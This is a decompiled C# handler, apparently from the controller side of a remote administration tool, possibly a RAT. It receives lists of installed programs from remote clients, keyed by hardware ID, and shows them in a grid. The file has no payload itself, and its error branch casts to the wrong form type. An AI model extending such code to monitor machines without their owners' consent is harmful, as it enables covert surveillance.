using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000053 RID: 83
	internal class HandlerPrograms
	{
		// Token: 0x060001DC RID: 476 RVA: 0x0001D974 File Offset: 0x0001BB74
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Error"))
				{
					if (!(a == "List"))
					{
						return;
					}
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormPrograms form = (FormPrograms)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.dataGridView2.Rows.Clear();
						form.materialLabel1.Text = "Succues list Programs";
						int i = 2;
						while (i < objects.Length)
						{
							DataGridViewRow dataGridViewRow = new DataGridViewRow();
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[i++]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[i++]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[i++]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[i++]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[i++]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[i++]
							});
							form.dataGridView2.Rows.Add(dataGridViewRow);
						}
					}));
					return;
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormNetstat form = (FormNetstat)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.materialLabel1.Text = "Error: " + (string)objects[2];
					}));
					return;
				}
			}
			else
			{
				FormPrograms form = (FormPrograms)Application.OpenForms["Programs:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Programs [" + (string)objects[2] + "]";
					form.client = client;
					form.materialLabel1.Enabled = true;
					form.dataGridView2.Enabled = true;
					form.materialLabel1.Text = "Succues Connect";
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
